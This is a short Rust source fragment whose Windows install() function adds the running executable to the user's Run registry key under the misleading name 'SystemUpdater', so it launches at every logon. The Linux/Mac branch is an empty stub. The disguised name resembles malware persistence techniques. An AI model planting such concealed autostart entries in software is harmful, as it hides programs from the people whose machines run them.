#[cfg(target_os = "windows")]
pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    use winreg::RegKey;
    use winreg::enums::*;

    let exe = std::env::current_exe()?;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
    key.set_value("SystemUpdater", &exe.to_str().unwrap())?;

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    // Implementar para Linux/Mac
    Ok(())
}
